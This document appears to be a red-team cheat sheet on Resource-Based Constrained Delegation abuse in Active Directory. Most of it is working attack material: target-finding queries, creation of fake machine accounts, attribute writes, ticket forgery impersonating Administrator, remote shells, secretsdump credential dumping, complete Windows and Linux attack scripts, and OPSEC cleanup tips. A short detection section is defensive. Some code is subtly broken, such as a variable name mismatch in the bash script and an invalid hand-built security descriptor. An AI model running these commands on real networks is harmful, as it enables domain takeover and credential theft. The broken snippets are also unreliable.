# Resource-Based Constrained Delegation (RBCD) Abuse

## Overview

Resource-Based Constrained Delegation (RBCD) is the inverse of traditional constrained delegation. Instead of the **front-end** service controlling who it can delegate to, the **back-end** resource (target) controls who can delegate to it via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

This attribute on a computer object (or user) contains the SID of the security principal that is allowed to delegate to that computer.

**Key insight**: If you have `GenericWrite`, `GenericAll`, or `WriteDACL` on a **computer object**, you can write to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute and grant any user/computer the ability to impersonate any user to that target.

## Finding RBCD Targets

### PowerView

```powershell
# Find computers where msDS-AllowedToActOnBehalfOfOtherIdentity is already set
Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -Properties dnshostname,msDS-AllowedToActOnBehalfOfOtherIdentity

# Find computers you can modify (GenericWrite/GenericAll)
# First find your SID
$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value

# Check ACLs on computer objects
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {
  $_.SecurityIdentifier -eq $sid -and
  ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl|WriteOwner")
}

# Or use Find-InterestingDomainAcl
Find-InterestingDomainAcl | ? { $_.ObjectType -like "*Computer*" }

# Show all computers and their ACL state
Get-DomainComputer | ForEach-Object {
  $computer = $_.dnshostname
  $acl = Get-DomainObjectAcl -Identity $_ -ResolveGUIDs
  $interesting = $acl | ? { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll" }
  if ($interesting) { [PSCustomObject]@{Computer=$computer;ACL=$interesting.ActiveDirectoryRights} }
}
```

### BloodHound

```cypher
// Find computers where you have GenericWrite/GenericAll
MATCH (n)-[r:GenericAll|GenericWrite]->(c:Computer)
RETURN n.name, TYPE(r), c.name

// Computers already configured with RBCD
MATCH (c:Computer)<-[:AllowedToDelegate]-(n)
RETURN n.name AS AllowedAccount, c.name AS TargetComputer

// Find all control paths to computer objects
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})
MATCH (c:Computer)
MATCH p = (u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..]->(c)
RETURN u.name, c.name, length(p) AS PathLength
ORDER BY PathLength ASC

// Computers where a domain admin has a session (prime RBCD targets)
MATCH (u:User)-[:HasSession]->(c:Computer)
MATCH (u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN c.name AS Target, u.name AS DA_User
```

## Exploitation — Full Attack Chain

### Prerequisites
- `GenericWrite`, `GenericAll`, `WriteDACL`, or `WriteOwner` on a target computer
- Control of a user account (or computer account) with SPN configured — typically create a new computer account or use an existing one
- Ability to authenticate as the controlled account to request TGS tickets

### Step 1: Create or Obtain a Controlled Account with SPN

#### Option A: Create a Domain User (must have rights to create users)

```powershell
# Create a domain user
New-DomainUser -AccountPassword (ConvertTo-SecureString "P@ss123" -AsPlainText -Force) -Name "attacker" -SamAccountName "attacker" -Verbose

# Set SPN on the user (required for S4U2Self)
Set-DomainObject -Identity attacker -SET @{serviceprincipalname='http/test'}

# Get the SID of the controlled account
$sid = Get-DomainUser -Identity attacker | Select -ExpandProperty objectsid
```

#### Option B: Create a Machine Account

```powershell
# If you have rights to join computers to domain (default: authenticated users can create 10 machine accounts)
# Using PowerMad or SharpMad

# PowerView - requires RSAT or AD module
New-MachineAccount -MachineName "FAKECOMPUTER" -Password (ConvertTo-SecureString "P@ss123" -AsPlainText -Force)

# Get SID
$sid = Get-DomainComputer -Identity "FAKECOMPUTER$" | Select -ExpandProperty objectsid

# Get the machine account hash
$machinePassword = "P@ss123"
```

#### Option C: Use an Existing Computer Account

```powershell
# If you have the hash of an existing computer account, you can use it
# Computer accounts automatically have SPN set (HOST/computername)
$sid = Get-DomainComputer -Identity "EXISTINGPC$" | Select -ExpandProperty objectsid
```

### Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on Target

#### PowerView — Setting the attribute

```powershell
# Convert SID to raw bytes for the attribute
$sid = "S-1-5-21-YYYYY-YYYY-YYYY-ZZZZ"  # SID of controlled account

# Use PowerView's Set-DomainObject
# This relies on having GenericWrite on the target computer
$RawBytes = New-Object byte[] (28 + 4)
$RawBytes[0] = 1  # Revision
$RawBytes[4] = 1  # SubAuthorityCount
$RawBytes[8] = 1  # ACE type (ACCESS_ALLOWED_ACE)
$RawBytes[12] = 0xf  # ACE flags (CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE)
$RawBytes[16] = 0xf0  # Access mask (GENERIC_ALL)
$sidBytes = ([System.Security.Principal.SecurityIdentifier]$sid).GetBytes()
$sidBytes.CopyTo($RawBytes, 20)
Set-DomainObject -Identity target_computer -SET @{ 'msDS-AllowedToActOnBehalfOfOtherIdentity' = $RawBytes } -Verbose
```

#### PowerView — Alternate method (precalculated raw bytes)

```powershell
# Using the raw SDDL approach
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target_computer -SET @{ 'msDS-AllowedToActOnBehalfOfOtherIdentity' = $SDBytes } -Verbose
```

#### Impacket rbcd.py (Linux)

```bash
# Using rbcd.py from impacket
# -f is the account to grant delegation rights to (FQDN format)
# -t is the target computer

# Grant attacker account rights to delegate to TARGET$
python3 rbcd.py -f attacker -t target_machine domain.local/user:pass -dc-ip 10.10.10.10

# Grant machine account rights
python3 rbcd.py -f FAKECOMPUTER$ -t TARGET$ -dc-ip 10.10.10.10 domain.local/user:pass

# With explicit domain
python3 rbcd.py -f 'S-1-5-21-...' -t target_machine domain.local/user:pass -dc-ip 10.10.10.10

# Delete RBCD entry (cleanup)
python3 rbcd.py -f attacker -t target_machine domain.local/user:pass -dc-ip 10.10.10.10 -delete

# Check current RBCD configuration
python3 rbcd.py -f attacker -t target_machine domain.local/user:pass -dc-ip 10.10.10.10 -action read
```

### Step 3: Request TGS as Impersonated User

#### Using Rubeus (Windows)

```powershell
# Request a TGS for cifs on target computer as Administrator
Rubeus.exe s4u /user:attacker /rc4:USER_HASH /domain:domain.local /impersonateuser:Administrator /msdsspn:cifs/target_computer.domain.local /ptt

# Using machine account (FAKECOMPUTER$)
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:MACHINE_HASH /domain:domain.local /impersonateuser:Administrator /msdsspn:cifs/target_computer.domain.local /ptt

# With altservice (if cifs not available, use host)
Rubeus.exe s4u /user:attacker /rc4:HASH /impersonateuser:Administrator /msdsspn:host/target_computer.domain.local /ptt

# With /nowrap for base64 output
Rubeus.exe s4u /user:attacker /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target_computer.domain.local /nowrap
```

#### Using getST.py (Linux)

```bash
# Request TGS for cifs on target as Administrator
python3 getST.py domain.local/attacker:'P@ss123' -spn cifs/target_computer.domain.local -impersonate Administrator -dc-ip 10.10.10.10

# Using machine account (FAKECOMPUTER$)
python3 getST.py domain.local/FAKECOMPUTER$:'P@ss123' -spn cifs/target_computer.domain.local -impersonate Administrator -dc-ip 10.10.10.10

# Export ticket
export KRB5CCNAME=Administrator.ccache
```

### Step 4: Use the Ticket

```powershell
# Windows (if /ptt used)
klist
ls \\target_computer.domain.local\c$
dir \\target_computer.domain.local\admin$
gwmi -ComputerName target_computer win32_service
Enter-PSSession -ComputerName target_computer.domain.local

# Linux
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -k -no-pass target_computer.domain.local
python3 wmiexec.py -k -no-pass target_computer.domain.local
python3 secretsdump.py -k -no-pass target_computer.domain.local
```

### Step 5: Cleanup (Remove RBCD Entry)

```bash
# Remove the RBCD attribute after attack
python3 rbcd.py -f attacker -t target_machine domain.local/user:pass -dc-ip 10.10.10.10 -delete

# PowerView cleanup
Set-DomainObject -Identity target_computer -CLEAR 'msDS-AllowedToActOnBehalfOfOtherIdentity'
```

## Complete Attack Script (Windows)

```powershell
# Check if you can create machine accounts (default: ms-DS-MachineAccountQuota = 10)

# 1. Create fake machine account
New-MachineAccount -MachineName "FAKEPC" -Password (ConvertTo-SecureString "h4ck3r!" -AsPlainText -Force)

# 2. Get SID
$sid = Get-DomainComputer "FAKEPC" -Properties objectsid | Select -ExpandProperty objectsid
Write-Host "[+] Fake computer SID: $sid"

# 3. Set RBCD on target (requires GenericWrite/GenericAll)
Set-DomainObject -Identity "TARGETPC" -SET @{
  'msDS-AllowedToActOnBehalfOfOtherIdentity' = (
    New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
  ).GetSddlForm()
} -Verbose

# 4. Convert password to hash for Rubeus
# Use Rubeus hash or compute manually

# 5. Request TGS as Administrator
Rubeus.exe s4u /user:FAKEPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGETPC.domain.local /ptt

# 6. Access target
ls \\TARGETPC.domain.local\c$

# 7. Cleanup
Set-DomainObject -Identity "TARGETPC" -CLEAR 'msDS-AllowedToActOnBehalfOfOtherIdentity'
```

## Complete Attack (Linux — Impacket)

```bash
#!/bin/bash
# Requires: Impacket, domain creds, target computer FQDN

DOMAIN="domain.local"
USER="user"
PASS="pass"
DC_IP="10.10.10.10"
TARGET="TARGETPC.domain.local"
FAKE_PC="FAKEPC"

# 1. Create a machine account
python3 addcomputer.py "$DOMAIN/$USER:$PASS" -method SAMR -computer-name "$FAKEPC" -computer-pass 'h4ck3r!' -dc-ip "$DC_IP"

# 2. Set RBCD (grant FAKEPC$ delegation rights to TARGET)
python3 rbcd.py -f "$FAKEPC" -t "$TARGET" "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP"

# 3. Request TGS as Administrator
python3 getST.py "$DOMAIN/$FAKEPC\$:h4ck3r!" -spn "cifs/$TARGET" -impersonate Administrator -dc-ip "$DC_IP"

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
python3 smbexec.py -k -no-pass "$TARGET"

# 5. Cleanup
python3 rbcd.py -f "$FAKEPC" -t "$TARGET" "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -delete
```

## OPSEC Considerations

- **msDS-AllowedToActOnBehalfOfOtherIdentity modification** generates Event ID 5136 (Directory Service change)
- **Creating machine accounts** generates Event ID 4741 (computer account created)
- **S4U2Self/S4U2Proxy** request generates Event ID 4769 on the KDC
- **RBCD modification** can be detected by monitoring changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- **Machine account creation** is often limited by `ms-DS-MachineAccountQuota` (default: 10)
- **Cleanup**: Removing the RBCD entry reduces detection risk but if detected, the change will still show in logs
- **Time window**: The RBCD entitlement persists until removed

## Detection

| Event ID | Description |
|----------|-------------|
| 5136 | Directory Service modification (RBCD attribute set/cleared) |
| 4741 | Computer account created (if creating fake machine) |
| 4769 | Kerberos TGS request (S4U2Proxy used) |
| 4624 | Successful logon (using delegated ticket) |

### Blue Team Detection

```powershell
# Detect RBCD modifications
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5136} |
  Where-Object { $_.Properties[1].Value -like "*msDS-AllowedToActOnBehalfOfOtherIdentity*" }

# Monitor for machine account creation spikes
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4741} |
  Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-24) }
```

## Quick Reference

```powershell
# Find modifiable computers (PowerView)
Find-InterestingDomainAcl | ? { $_.ObjectType -match "Computer" }

# Create fake machine account
New-MachineAccount -MachineName "FAKEPC" -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)

# Set RBCD via PowerView
Set-DomainObject -Identity target_computer -SET @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$rawBytes}

# Set RBCD via rbcd.py (Linux)
python3 rbcd.py -f FAKEPC$ -t TARGET$ domain/user:pass -dc-ip DC

# Get TGS (Rubeus)
Rubeus.exe s4u /user:FAKEPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /ptt

# Get TGS (getST.py)
python3 getST.py domain/FAKEPC\$:pass -spn cifs/TARGET -impersonate Administrator -dc-ip DC

# BloodHound find RBCD path
MATCH (n)-[:GenericAll|GenericWrite]->(c:Computer)
MATCH (da:User)-[:HasSession]->(c)
WHERE (da)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN n.name, c.name, da.name
```
